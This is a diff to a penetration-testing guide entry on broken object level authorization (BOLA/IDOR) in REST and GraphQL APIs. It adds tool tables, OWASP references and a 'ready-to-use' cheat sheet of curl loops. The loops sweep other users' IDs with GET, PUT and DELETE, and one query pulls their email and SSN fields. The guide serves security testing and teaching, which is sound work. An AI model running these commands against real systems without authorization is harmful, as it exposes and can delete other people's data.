@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [api, rest, graphql, soap, wstg, apit]
 tech_stack: []
 cwe_ids: [CWE-200]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-apit-01, wstg-apit-00]
+prerequisites: [wstg-conf-03, wstg-conf-06, wstg-apit-01]
+severity_boost:
+  wstg-apit-01: "A full endpoint/schema map from recon combined with confirmed BOLA lets an attacker systematically exfiltrate every object type at scale, turning an isolated finding into a mass data breach (Critical)"
 ---
 
 # wstg-apit-02
@@ -156,6 +157,66 @@ tester.generate_report()
 
 ---
 
+## Tools
+
+| Tool                 | Description                    | Usage                              |
+| --------------------- | ------------------------------- | ------------------------------------ |
+| **Burp Intruder**      | ID enumeration/fuzzing          | Sweep numeric or encoded IDs         |
+| **Autorize (Burp)**    | Auto authorization diffing      | Compares low-priv vs high-priv responses |
+| **OWASP ZAP**          | Active scanner                  | Automated BOLA detection             |
+| **Postman/Newman**     | API collection runner           | Scripted BOLA regression tests       |
+| **InQL (Burp)**        | GraphQL testing                 | GraphQL-specific BOLA checks         |
+
+---
+
+## Example Commands/Payloads
+
+### Ready-to-Use BOLA Cheat Sheet
+
+```bash
+BASE="https://{target}/api"
+TOKEN="user_token"
+OWN_ID=100
+
+# Sequential ID sweep across GET/PUT/DELETE
+for id in $(seq $((OWN_ID-5)) $((OWN_ID+5))); do
+  [ "$id" = "$OWN_ID" ] && continue
+  for m in GET PUT DELETE; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" \
+      "$BASE/users/$id" -H "Authorization: Bearer $TOKEN")
+    [ "$code" = "200" ] || [ "$code" = "204" ] && echo "[VULN] $m /users/$id -> $code"
+  done
+done
+
+# BOLA via nested/related resource
+curl -s "$BASE/users/$((OWN_ID+1))/orders" -H "Authorization: Bearer $TOKEN"
+curl -s "$BASE/users/$((OWN_ID+1))/documents" -H "Authorization: Bearer $TOKEN"
+
+# BOLA via request body instead of URL path
+curl -s -X POST "$BASE/user/data" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" -d "{\"user_id\": $((OWN_ID+1))}"
+
+# BOLA in batch/bulk endpoints
+curl -s -X POST "$BASE/users/batch" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"ids\": [$OWN_ID, $((OWN_ID+1)), $((OWN_ID+2))]}"
+
+# GraphQL BOLA
+curl -s -X POST "https://{target}/graphql" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\": \"query { user(id: $((OWN_ID+1))) { id name email ssn } }\"}"
+```
+
+### Detection Patterns
+
+| Signal                                          | Meaning                       |
+| ---------------------------------------------------| --------------------------------- |
+| `200`/`204` returned for an ID that isn't the caller's own | BOLA confirmed              |
+| Batch endpoint returns data for IDs not owned by caller     | Bulk BOLA — higher-impact finding |
+| GraphQL field resolves any `id` without ownership check      | GraphQL BOLA                  |
+
+---
+
 ## Remediation
 
 ```python
@@ -187,6 +248,13 @@ def get_user(user_id):
 | ----------- | ------------------------------------------------ |
 | **CWE-639** | Authorization Bypass Through User-Controlled Key |
 
+---
+
+## References
+
+- [OWASP API Security Top 10 - API1:2023 BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
+- [OWASP WSTG - API Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-API_Testing/)
+- [PortSwigger IDOR/BOLA](https://portswigger.net/web-security/access-control/idor)
 
 ---
 
